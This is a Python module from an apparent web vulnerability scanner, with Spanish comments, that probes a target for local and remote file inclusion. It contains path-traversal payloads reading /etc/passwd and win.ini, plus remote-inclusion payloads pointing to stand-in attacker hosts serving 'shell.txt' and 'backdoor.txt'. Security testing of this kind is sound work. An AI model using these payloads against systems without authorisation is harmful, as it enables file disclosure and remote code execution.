"""
Módulo de detección de LFI/RFI (Local/Remote File Inclusion).
Detecta vulnerabilidades de inclusión de archivos locales y remotos.
CVSS: 9.1 (Critical para RFI), 7.5 (High para LFI)
"""
from core.base_module import VulnerabilityModule
from core.logger import get_logger
import requests
import re
import os
import json
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup


class LFIModule(VulnerabilityModule):
    """Módulo para detectar vulnerabilidades de LFI/RFI."""
    
    def __init__(self, config):
        super().__init__(config)
        self.logger = get_logger("lfi_module")
        self.findings = []
        self.target_url = config.get("target_url")
        self.report_dir = config.get("report_dir", "reports")
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.payloads = self._load_payloads()
        
        # Signatures para detectar LFI exitoso
        self.lfi_signatures = {
            'linux': [
                'root:x:0:0:',
                'daemon:',
                '/bin/bash',
                '/bin/sh'
            ],
            'windows': [
                '[extensions]',
                '; for 16-bit app support',
                '[fonts]',
                '[mail]'
            ]
        }
        
        # Payloads RFI
        self.rfi_payloads = [
            'http://evil.com/shell.txt',
            'https://attacker.com/backdoor.txt',
            '//evil.com/shell.txt'
        ]
    
    def _load_payloads(self):
        """Carga payloads desde archivo."""
        payloads = []
        payload_file = "payloads/lfi.txt"
        
        try:
            if os.path.exists(payload_file):
                with open(payload_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            payloads.append(line)
            
            # Payloads adicionales si el archivo está vacío
            if not payloads:
                payloads = [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\win.ini',
                    '../../../../etc/passwd',
                    '..\\..\\..\\..\\windows\\win.ini',
                    '../../../../../etc/passwd',
                    '..\\..\\..\\..\\..\\windows\\win.ini',
                    '/etc/passwd',
                    'C:\\windows\\win.ini',
                    '....//....//....//etc/passwd',
                    '..../..../..../windows/win.ini',
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                    '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini'
                ]
            
            self.logger.info(f"Cargados {len(payloads)} payloads LFI")
            return payloads
        
        except Exception as e:
            self.logger.error(f"Error cargando payloads: {e}")
            return []
    
    def scan(self):
        """Detecta vulnerabilidades de LFI/RFI."""
        self.logger.info("=== Iniciando escaneo LFI/RFI ===")
        
        try:
            # 1. Descubrir puntos de inyección
            injection_points = self._discover_injection_points()
            
            if not injection_points:
                self.logger.info("No se encontraron puntos de inyección para LFI/RFI")
                return
            
            # 2. Probar LFI (Local File Inclusion)
            self._test_lfi(injection_points)
            
            # 3. Probar RFI (Remote File Inclusion)
            self._test_rfi(injection_points)
            
            self._export_results()
            self.logger.info(f"Escaneo LFI/RFI completado: {len(self.findings)} hallazgos")
            
        except Exception as e:
            self.logger.error(f"Error en escaneo LFI/RFI: {e}")
    
    def _discover_injection_points(self):
        """Descubre parámetros susceptibles a LFI/RFI."""
        self.logger.info("Descubriendo puntos de inyección...")
        
        injection_points = []
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            parsed_url = urlparse(self.target_url)
            
            # 1. Parámetros en URL
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                
                # Parámetros comunes para LFI
                lfi_params = ['file', 'path', 'page', 'include', 'doc', 'document', 
                             'folder', 'root', 'pg', 'style', 'pdf', 'template', 
                             'php_path', 'document_root']
                
                for param in params.keys():
                    if any(lfi_param in param.lower() for lfi_param in lfi_params):
                        injection_points.append({
                            'type': 'url_param',
                            'param': param,
                            'url': self.target_url,
                            'original_value': params[param][0]
                        })
                        self.logger.info(f"Punto de inyección encontrado: {param}")
            
            # 2. Buscar en enlaces de la página
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            
            for link in links[:20]:  # Limitar a 20 enlaces
                href = link['href']
                full_url = urljoin(self.target_url, href)
                parsed = urlparse(full_url)
                
                if parsed.query:
                    params = parse_qs(parsed.query)
                    for param in params.keys():
                        if any(lfi_param in param.lower() for lfi_param in ['file', 'path', 'page']):
                            injection_points.append({
                                'type': 'url_param',
                                'param': param,
                                'url': full_url,
                                'original_value': params[param][0]
                            })
        
        except Exception as e:
            self.logger.error(f"Error descubriendo puntos de inyección: {e}")
        
        self.logger.info(f"Total puntos de inyección: {len(injection_points)}")
        return injection_points
    
    def _test_lfi(self, injection_points):
        """Prueba Local File Inclusion."""
        self.logger.info("Probando LFI (Local File Inclusion)...")
        
        for point in injection_points:
            param = point['param']
            base_url = point['url']
            
            for payload in self.payloads[:15]:  # Limitar payloads
                try:
                    # Construir URL con payload
                    parsed = urlparse(base_url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Verificar si el payload fue exitoso
                    if self._is_lfi_vulnerable(response.text, payload):
                        finding = {
                            "vulnerability": "LFI - Local File Inclusion",
                            "severity": "high",
                            "cvss_score": 7.5,
                            "url": test_url,
                            "method": "GET",
                            "parameter": param,
                            "payload": payload,
                            "description": f"Vulnerabilidad LFI detectada en parámetro '{param}'",
                            "details": {
                                "injection_point": param,
                                "payload_used": payload,
                                "evidence": self._get_evidence(response.text)
                            },
                            "recommendation": "Validar y sanitizar todos los inputs de archivo. Usar whitelist de archivos permitidos. Evitar incluir archivos basados en input del usuario.",
                            "references": [
                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                                "https://cwe.mitre.org/data/definitions/98.html"
                            ]
                        }
                        self.findings.append(finding)
                        self.logger.warning(f"LFI detectado: {param} con payload {payload}")
                        break  # Solo reportar una vez por parámetro
                
                except Exception as e:
                    self.logger.debug(f"Error probando LFI: {e}")
    
    def _test_rfi(self, injection_points):
        """Prueba Remote File Inclusion."""
        self.logger.info("Probando RFI (Remote File Inclusion)...")
        
        for point in injection_points:
            param = point['param']
            base_url = point['url']
            
            for payload in self.rfi_payloads:
                try:
                    # Construir URL con payload RFI
                    parsed = urlparse(base_url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Verificar si intenta hacer request externo
                    # (En un escenario real, necesitarías un servidor controlado)
                    if self._is_rfi_vulnerable(response, payload):
                        finding = {
                            "vulnerability": "RFI - Remote File Inclusion",
                            "severity": "critical",
                            "cvss_score": 9.1,
                            "url": test_url,
                            "method": "GET",
                            "parameter": param,
                            "payload": payload,
                            "description": f"Posible vulnerabilidad RFI detectada en parámetro '{param}'",
                            "details": {
                                "injection_point": param,
                                "payload_used": payload,
                                "risk": "Permite ejecución remota de código arbitrario"
                            },
                            "recommendation": "CRÍTICO: Deshabilitar allow_url_include en PHP. Validar estrictamente todos los inputs. Usar whitelist de archivos locales únicamente.",
                            "references": [
                                "https://owasp.org/www-community/attacks/Remote_File_Inclusion",
                                "https://cwe.mitre.org/data/definitions/98.html"
                            ]
                        }
                        self.findings.append(finding)
                        self.logger.critical(f"RFI detectado: {param} con payload {payload}")
                        break
                
                except Exception as e:
                    self.logger.debug(f"Error probando RFI: {e}")
    
    def _is_lfi_vulnerable(self, response_text, payload):
        """Verifica si la respuesta indica LFI exitoso."""
        # Detectar signatures de archivos del sistema
        for os_type, signatures in self.lfi_signatures.items():
            for signature in signatures:
                if signature in response_text:
                    return True
        
        # Detectar path traversal exitoso
        if '../' in payload or '..\\'  in payload:
            if 'root:' in response_text or '[extensions]' in response_text:
                return True
        
        return False
    
    def _is_rfi_vulnerable(self, response, payload):
        """Verifica si la respuesta indica RFI exitoso."""
        # En un escenario real, verificarías si tu servidor recibió la petición
        # Por ahora, detectamos indicadores básicos
        
        # Si el servidor intenta resolver el dominio externo
        if response.status_code == 200:
            # Buscar errores de conexión externa
            error_indicators = [
                'failed to open stream',
                'Connection refused',
                'Unable to find',
                'getaddrinfo failed'
            ]
            
            for indicator in error_indicators:
                if indicator in response.text:
                    return True
        
        return False
    
    def _get_evidence(self, response_text):
        """Extrae evidencia de LFI exitoso."""
        evidence = []
        
        for os_type, signatures in self.lfi_signatures.items():
            for signature in signatures:
                if signature in response_text:
                    # Extraer contexto
                    idx = response_text.find(signature)
                    snippet = response_text[max(0, idx-50):min(len(response_text), idx+100)]
                    evidence.append(snippet)
                    break
        
        return evidence[:3]  # Máximo 3 evidencias
    
    def _export_results(self):
        """Exporta los resultados a JSON."""
        try:
            os.makedirs(self.report_dir, exist_ok=True)
            output_path = os.path.join(self.report_dir, "lfi_findings.json")
            
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(self.findings, f, indent=2, ensure_ascii=False)
            
            self.logger.info(f"Resultados LFI/RFI exportados: {output_path}")
        
        except Exception as e:
            self.logger.error(f"Error exportando resultados LFI: {e}")
    
    def get_results(self):
        """Devuelve los hallazgos encontrados."""
        return self.findings
